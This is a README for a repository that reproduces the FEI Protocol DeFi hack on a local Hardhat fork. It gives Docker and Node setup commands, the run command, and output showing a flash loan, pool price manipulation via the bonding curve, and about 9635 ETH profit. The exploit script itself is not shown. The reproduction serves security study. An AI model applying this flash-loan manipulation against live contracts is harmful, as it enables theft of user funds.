# fei-repro
Repro of FEI protocol hack on ubuntu:24.04

Link for read: https://medium.com/immunefi/a-guide-to-reproducing-ethereum-exploits-fei-protocol-224b30b517d6

Link for read: https://medium.com/@Brian.IsMeta/difficulty-of-reproducing-old-exploits-a613da2c2143

## for work on ubuntu:24.04

### start ubuntu:24.04
```
docker run -it --rm ubuntu:24.04 /bin/bash
```

### install dependency
```
apt-get update&& apt-get -y install curl git sudo nano mc
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
source ~/.bashrc
nvm install v22.20.0
npm install -g npm@11.6.1
npm install --global yarn
yarn add hardhat
```

### clone source
```
git clone https://github.com/klssstis/fei-repro&&cd fei-repro/
```

### insert your key
```
sed -i "s/<PUT YOUR API KEY HERE>/keykeykeykeykeykeykeykeykey/g" hardhat.config.js_
sed -i "s/<PUT YOUR API KEY HERE>/keykeykeykeykeykeykeykeykey/g" scripts/fei.js
```

### select hardhat-2
```
npx hardhat --init
```

### clean folder, after init
```
mv hardhat.config.js_ hardhat.config.js
rm contracts/Lock.sol
```
### start exploit 
```
npx hardhat run scripts/fei.js --verbose
```
### output
```
Exploit deployed to: 0x09635F643e140090A9A8Dcd712eD6285858ceBef
Balance before exploit 0n ETH
starting exploit
Updated oracle
Received WETH flashloan with premium 269
Dumped 207569 ETH on WETH/FEI pool
Bought Fei from bonding curve for 92430 ETH
Allocated ETH from Fei protocol
Swapped 527742092 Fei on WETH/FEI pool
Repaying ETH flashloan

##################################
ETH balance 9635065665081975267661 9635
If the balance is positive the exploit worked!
Balance after exploit 9635065665081975267661n ETH
```

